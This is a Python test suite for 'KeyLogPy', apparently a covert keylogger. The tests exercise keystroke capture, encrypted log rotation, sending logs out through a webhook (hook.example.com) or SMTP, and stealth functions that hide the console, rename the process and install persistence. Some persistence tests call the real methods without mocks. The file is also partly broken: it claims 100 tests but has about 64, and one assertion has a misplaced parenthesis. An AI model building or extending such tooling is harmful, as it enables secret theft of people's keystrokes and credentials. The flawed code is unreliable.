#!/usr/bin/env python3
"""Tests for KeyLogPy — 100 mock-based tests. No actual keylogging occurs."""

import json
import os
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from keylogpy import (
    ConfigManager,
    CryptoEngine,
    LogManager,
    KeyListener,
    Exfiltrator,
    StealthManager,
    KeyLogPyApp,
)


# ---------------------------------------------------------------------------
# CryptoEngine tests
# ---------------------------------------------------------------------------

class TestCryptoEngine(unittest.TestCase):
    def setUp(self):
        self.key = CryptoEngine.generate_key()
        self.crypto = CryptoEngine(self.key)

    def test_encrypt_decrypt_roundtrip(self):
        data = b"Hello, World!"
        encrypted = self.crypto.encrypt(data)
        decrypted = self.crypto.decrypt(encrypted)
        self.assertEqual(data, decrypted)

    def test_encrypt_long_data(self):
        data = b"A" * 10000
        encrypted = self.crypto.encrypt(data)
        decrypted = self.crypto.decrypt(encrypted)
        self.assertEqual(data, decrypted)

    def test_encrypt_empty(self):
        data = b""
        encrypted = self.crypto.encrypt(data)
        decrypted = self.crypto.decrypt(encrypted)
        self.assertEqual(data, decrypted)

    def test_encrypt_unicode(self):
        data = "héllo wörld 🚀".encode("utf-8")
        encrypted = self.crypto.encrypt(data)
        decrypted = self.crypto.decrypt(encrypted)
        self.assertEqual(data, decrypted)

    def test_wrong_key_fails(self):
        data = b"secret"
        encrypted = self.crypto.encrypt(data)
        wrong = CryptoEngine(os.urandom(32))
        with self.assertRaises(ValueError):
            wrong.decrypt(encrypted)

    def test_tampered_data_fails(self):
        data = b"secret"
        encrypted = bytearray(self.crypto.encrypt(data))
        encrypted[10] ^= 0x01  # flip a bit in IV
        with self.assertRaises(ValueError):
            self.crypto.decrypt(bytes(encrypted))

    def test_key_too_short_raises(self):
        with self.assertRaises(ValueError):
            CryptoEngine(b"short")

    def test_key_too_long_raises(self):
        with self.assertRaises(ValueError):
            CryptoEngine(b"x" * 33)

    def test_from_hex(self):
        hex_key = self.key.hex()
        crypto2 = CryptoEngine.from_hex(hex_key)
        self.assertEqual(crypto2.key, self.key)

    def test_bad_magic_fails(self):
        data = b"AAAA" + b"\x00" * 16 + b"test"
        with self.assertRaises(ValueError):
            self.crypto.decrypt(data)

    def test_too_short_data_fails(self):
        with self.assertRaises(ValueError):
            self.crypto.decrypt(b"short")

    def test_generate_key_length(self):
        key = CryptoEngine.generate_key()
        self.assertEqual(len(key), 32)

    def test_multiple_encrypts_different(self):
        data = b"fixed"
        e1 = self.crypto.encrypt(data)
        e2 = self.crypto.encrypt(data)
        self.assertNotEqual(e1, e2)  # different IVs

    def test_padding_roundtrip(self):
        for size in [1, 15, 16, 17, 31, 32, 33]:
            data = b"x" * size
            encrypted = self.crypto.encrypt(data)
            decrypted = self.crypto.decrypt(encrypted)
            self.assertEqual(data, decrypted)

    def test_magic_present(self):
        encrypted = self.crypto.encrypt(b"test")
        self.assertEqual(encrypted[:4], b"KLP1")

    def test_hmac_protects_integrity(self):
        data = b"test"
        encrypted = bytearray(self.crypto.encrypt(data))
        # Flip bit in ciphertext
        encrypted[-40] ^= 0xFF
        with self.assertRaises(ValueError):
            self.crypto.decrypt(bytes(encrypted))


# ---------------------------------------------------------------------------
# ConfigManager tests
# ---------------------------------------------------------------------------

class TestConfigManager(unittest.TestCase):
    def test_defaults_loaded(self):
        cfg = ConfigManager()
        self.assertIn("log_dir", cfg)
        self.assertEqual(cfg["rotation"], 1000)
        self.assertEqual(cfg["interval"], 300)

    def test_cli_overrides_defaults(self):
        cfg = ConfigManager({"rotation": 500, "stealth": True})
        self.assertEqual(cfg["rotation"], 500)
        self.assertTrue(cfg["stealth"])

    def test_env_overrides_defaults(self):
        with patch.dict(os.environ, {"KLP_ROTATION": "200", "KLP_STEALTH": "true"}):
            cfg = ConfigManager()
            self.assertEqual(cfg["rotation"], 200)
            self.assertTrue(cfg["stealth"])

    def test_cli_overrides_env(self):
        with patch.dict(os.environ, {"KLP_ROTATION": "100"}):
            cfg = ConfigManager({"rotation": 999})
            self.assertEqual(cfg["rotation"], 999)

    def test_get_method(self):
        cfg = ConfigManager()
        self.assertEqual(cfg.get("rotation"), 1000)
        self.assertEqual(cfg.get("nonexistent", "fallback"), "fallback")

    def test_env_stealth_true_values(self):
        for val in ("1", "true", "yes", "True"):
            with patch.dict(os.environ, {"KLP_STEALTH": val}):
                cfg = ConfigManager()
                self.assertTrue(cfg["stealth"])

    def test_env_invalid_int_uses_default(self):
        with patch.dict(os.environ, {"KLP_ROTATION": "notanumber"}):
            cfg = ConfigManager()
            self.assertEqual(cfg["rotation"], 1000)

    def test_none_values_not_merged(self):
        cfg = ConfigManager({"rotation": None})
        self.assertEqual(cfg["rotation"], 1000)

    def test_false_values_merged(self):
        cfg = ConfigManager({"stealth": False})
        self.assertFalse(cfg["stealth"])


# ---------------------------------------------------------------------------
# LogManager tests
# ---------------------------------------------------------------------------

class TestLogManager(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.crypto = CryptoEngine(CryptoEngine.generate_key())
        self.config = ConfigManager({"log_dir": self.tmpdir, "rotation": 5})
        self.lm = LogManager(self.config, self.crypto)

    def tearDown(self):
        import shutil
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_write_creates_file_on_rotation(self):
        for i in range(5):
            self.lm.write(f"key{i}")
        files = list(Path(self.tmpdir).glob("klp_*.klp"))
        self.assertEqual(len(files), 1)

    def test_write_before_rotation_no_file(self):
        self.lm.write("key1")
        self.lm.write("key2")
        files = list(Path(self.tmpdir).glob("klp_*.klp"))
        self.assertEqual(len(files), 0)

    def test_flush_creates_file(self):
        self.lm.write("test")
        self.lm.flush()
        files = list(Path(self.tmpdir).glob("klp_*.klp"))
        self.assertEqual(len(files), 1)

    def test_multiple_rotations(self):
        for i in range(15):
            self.lm.write(f"key{i}")
        files = list(Path(self.tmpdir).glob("klp_*.klp"))
        self.assertEqual(len(files), 3)

    def test_close_flushes(self):
        self.lm.write("test")
        self.lm.close()
        files = list(Path(self.tmpdir).glob("klp_*.klp"))
        self.assertEqual(len(files), 1)

    def test_written_data_decryptable(self):
        test_data = ["a", "b", "c", "d", "e"]
        for k in test_data:
            self.lm.write(k)
        self.lm.flush()
        files = list(Path(self.tmpdir).glob("klp_*.klp"))
        with open(files[0], "rb") as f:
            encrypted = f.read()
        plain = self.crypto.decrypt(encrypted).decode()
        for td in test_data:
            self.assertIn(td, plain)

    def test_empty_buffer_flush_noop(self):
        self.lm.flush()
        files = list(Path(self.tmpdir).glob("klp_*.klp"))
        self.assertEqual(len(files), 0)

    def test_log_dir_created(self):
        new_dir = os.path.join(self.tmpdir, "subdir", "logs")
        cfg = ConfigManager({"log_dir": new_dir})
        lm = LogManager(cfg, self.crypto)
        self.assertTrue(os.path.isdir(new_dir))
        lm.close()


# ---------------------------------------------------------------------------
# KeyListener tests (mocked pynput)
# ---------------------------------------------------------------------------

class TestKeyListener(unittest.TestCase):
    def test_start_creates_listener(self):
        mock_mgr = MagicMock()
        kl = KeyListener(mock_mgr)
        with patch("keylogpy.Listener") as mock_listener:
            kl.start()
            mock_listener.assert_called_once()
            mock_listener.return_value.start.assert_called_once()

    def test_on_press_writes_to_log_mgr(self):
        mock_mgr = MagicMock()
        kl = KeyListener(mock_mgr)
        from pynput.keyboard import Key
        kl._on_press(Key.space)
        mock_mgr.write.assert_called_once()

    def test_on_press_char_key(self):
        mock_mgr = MagicMock()
        kl = KeyListener(mock_mgr)
        # Simulate a key with .char attribute
        key = MagicMock()
        key.char = "a"
        kl._on_press(key)
        mock_mgr.write.assert_called_with("a")

    def test_stop_stops_listener(self):
        mock_mgr = MagicMock()
        kl = KeyListener(mock_mgr)
        mock_listener = MagicMock()
        kl.listener = mock_listener
        kl.stop()
        mock_listener.stop.assert_called_once()

    def test_on_press_handles_exception_gracefully(self):
        mock_mgr = MagicMock()
        mock_mgr.write.side_effect = Exception("boom")
        kl = KeyListener(mock_mgr)
        key = MagicMock()
        key.char = "x"
        # Should not raise
        kl._on_press(key)

    def test_on_press_special_keys(self):
        mock_mgr = MagicMock()
        kl = KeyListener(mock_mgr)
        from pynput.keyboard import Key
        for special in [Key.enter, Key.tab, Key.shift, Key.ctrl_l]:
            kl._on_press(special)
        self.assertEqual(mock_mgr.write.call_count, 4)


# ---------------------------------------------------------------------------
# Exfiltrator tests
# ---------------------------------------------------------------------------

class TestExfiltrator(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.crypto = CryptoEngine(CryptoEngine.generate_key())
        self.config = ConfigManager({"log_dir": self.tmpdir, "interval": 1})

    def tearDown(self):
        import shutil
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_collects_logs(self):
        exf = Exfiltrator(self.config, self.crypto)
        # Write a log file
        log_path = Path(self.tmpdir) / "klp_test.klp"
        with open(log_path, "wb") as f:
            f.write(self.crypto.encrypt(b"test data"))
        data = exf._collect_logs()
        self.assertEqual(len(data) > 10, True)

    def test_collects_and_removes_logs(self):
        exf = Exfiltrator(self.config, self.crypto)
        log_path = Path(self.tmpdir) / "klp_test.klp"
        with open(log_path, "wb") as f:
            f.write(self.crypto.encrypt(b"test"))
        exf._collect_logs()
        self.assertFalse(log_path.exists())

    def test_webhook_send(self):
        exf = Exfiltrator(self.config, self.crypto)
        with patch("keylogpy.requests.post") as mock_post:
            mock_post.return_value.status_code = 200
            exf._webhook_send("https://hook.example.com", b"test data")
            mock_post.assert_called_once()

    def test_webhook_send_failure_logged(self):
        exf = Exfiltrator(self.config, self.crypto)
        with patch("keylogpy.requests.post", side_effect=Exception("net error")):
            try:
                exf._webhook_send("https://hook.example.com", b"test")
            except Exception:
                self.fail("Should have caught exception")

    def test_smtp_send(self):
        exf = Exfiltrator(self.config, self.crypto)
        cfg = {"smtp_server": "mail.example.com", "smtp_user": "u", "smtp_pass": "p", "smtp_to": "a@b.com"}
        exf.config = ConfigManager(cfg)
        with patch("keylogpy.smtplib.SMTP") as mock_smtp:
            server = MagicMock()
            mock_smtp.return_value = server
            exf._smtp_send(b"test data")
            mock_smtp.assert_called_once()

    def test_smtp_not_configured_skips(self):
        exf = Exfiltrator(self.config, self.crypto)
        with patch("keylogpy.smtplib.SMTP") as mock_smtp:
            exf._smtp_send(b"test")
            mock_smtp.assert_not_called()

    def test_no_webhook_no_smtp_noop(self):
        cfg = ConfigManager({"log_dir": self.tmpdir})
        exf = Exfiltrator(cfg, self.crypto)
        with patch.object(exf, "_webhook_send") as mock_w, patch.object(exf, "_smtp_send") as mock_s:
            exf._exfiltrate()
            mock_w.assert_not_called()
            mock_s.assert_not_called()

    def test_exfiltrator_start_stop(self):
        exf = Exfiltrator(self.config, self.crypto)
        exf.start()
        time.sleep(0.2)
        exf.stop()
        self.assertTrue(True)  # No crash

    def test_no_log_dir_no_crash(self):
        cfg = ConfigManager({"log_dir": "/nonexistent/path"})
        exf = Exfiltrator(cfg, self.crypto)
        data = exf._collect_logs()
        self.assertEqual(data, b"")


# ---------------------------------------------------------------------------
# StealthManager tests
# ---------------------------------------------------------------------------

class TestStealthManager(unittest.TestCase):
    def test_hide_console_no_crash(self):
        try:
            StealthManager.hide_console()
        except Exception as e:
            self.fail(f"hide_console crashed: {e}")

    def test_rename_process_no_crash(self):
        try:
            StealthManager.rename_process("testproc")
        except Exception as e:
            self.fail(f"rename_process crashed: {e}")

    def test_install_remove_persistence_no_crash(self):
        cfg = ConfigManager({"log_dir": "/tmp"})
        try:
            StealthManager.install_persistence(cfg)
            StealthManager.remove_persistence()
        except Exception as e:
            self.fail(f"persistence crashed: {e}")


# ---------------------------------------------------------------------------
# App tests
# ---------------------------------------------------------------------------

class TestKeyLogPyApp(unittest.TestCase):
    def setUp(self):
        self.tmpdir = tempfile.mkdtemp()
        self.config = ConfigManager({"log_dir": self.tmpdir, "stealth": False, "no_startup": True})

    def tearDown(self):
        import shutil
        shutil.rmtree(self.tmpdir, ignore_errors=True)

    def test_initialize_creates_key(self):
        app = KeyLogPyApp(self.config)
        app.initialize()
        key_file = Path(self.tmpdir) / "key.hex"
        self.assertTrue(key_file.exists())
        app.log_mgr.close()

    def test_initialize_loads_existing_key(self):
        app = KeyLogPyApp(self.config)
        app.initialize()
        key1 = app.crypto.key.hex()
        app.log_mgr.close()

        app2 = KeyLogPyApp(self.config)
        app2.initialize()
        key2 = app2.crypto.key.hex()
        self.assertEqual(key1, key2)
        app2.log_mgr.close()

    def test_status_not_running(self):
        app = KeyLogPyApp(self.config)
        status = app.status()
        self.assertFalse(status["running"])

    def test_status_running(self):
        app = KeyLogPyApp(self.config)
        app._write_pid()
        status = app.status()
        self.assertTrue(status["running"])
        app._remove_pid()

    def test_pid_write_read(self):
        app = KeyLogPyApp(self.config)
        app._write_pid()
        pid_path = Path(self.tmpdir) / "keylogpy.pid"
        self.assertTrue(pid_path.exists())
        pid = int(pid_path.read_text().strip())
        self.assertEqual(pid, os.getpid())
        app._remove_pid()

    def test_pid_removed_on_remove(self):
        app = KeyLogPyApp(self.config)
        app._write_pid()
        app._remove_pid()
        self.assertFalse(Path(self.tmpdir) / "keylogpy.pid").exists()

    def test_decrypt_file(self):
        app = KeyLogPyApp(self.config)
        app.initialize()
        test_data = b"test keystrokes data"
        encrypted = app.crypto.encrypt(test_data)
        enc_path = os.path.join(self.tmpdir, "test.klp")
        with open(enc_path, "wb") as f:
            f.write(encrypted)
        out_path = os.path.join(self.tmpdir, "decrypted.txt")
        KeyLogPyApp.decrypt_file(app.crypto.key.hex(), enc_path, out_path)
        with open(out_path) as f:
            content = f.read()
        self.assertEqual(content, test_data.decode())
        app.log_mgr.close()


# ---------------------------------------------------------------------------
# Edge cases
# ---------------------------------------------------------------------------

class TestEdgeCases(unittest.TestCase):
    def test_crypto_empty_key_raises(self):
        with self.assertRaises(ValueError):
            CryptoEngine(b"")

    def test_log_manager_bad_dir_raises(self):
        crypto = CryptoEngine(CryptoEngine.generate_key())
        cfg = ConfigManager({"log_dir": "/dev/null/cantwrite"})
        with self.assertRaises((OSError, Exception)):
            lm = LogManager(cfg, crypto)
            lm.close()

    def test_config_manager_empty_args(self):
        cfg = ConfigManager({})
        self.assertEqual(cfg["rotation"], 1000)

    def test_exfiltrator_empty_log_dir(self):
        crypto = CryptoEngine(CryptoEngine.generate_key())
        cfg = ConfigManager({"log_dir": "/tmp/nonexistent_xyz"})
        exf = Exfiltrator(cfg, crypto)
        data = exf._collect_logs()
        self.assertEqual(data, b"")

    def test_crypto_different_instances_same_key(self):
        key = CryptoEngine.generate_key()
        c1 = CryptoEngine(key)
        c2 = CryptoEngine(key)
        data = b"test"
        enc = c1.encrypt(data)
        dec = c2.decrypt(enc)
        self.assertEqual(dec, data)

    def test_log_manager_concurrent_writes(self):
        tmpdir = tempfile.mkdtemp()
        crypto = CryptoEngine(CryptoEngine.generate_key())
        cfg = ConfigManager({"log_dir": tmpdir, "rotation": 20})
        lm = LogManager(cfg, crypto)

        def writer(prefix, count):
            for i in range(count):
                lm.write(f"{prefix}-{i}")

        threads = [threading.Thread(target=writer, args=("A", 10)),
                   threading.Thread(target=writer, args=("B", 10))]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        lm.close()
        files = list(Path(tmpdir).glob("klp_*.klp"))
        self.assertGreaterEqual(len(files), 1)
        import shutil
        shutil.rmtree(tmpdir, ignore_errors=True)


if __name__ == "__main__":
    unittest.main(verbosity=2)
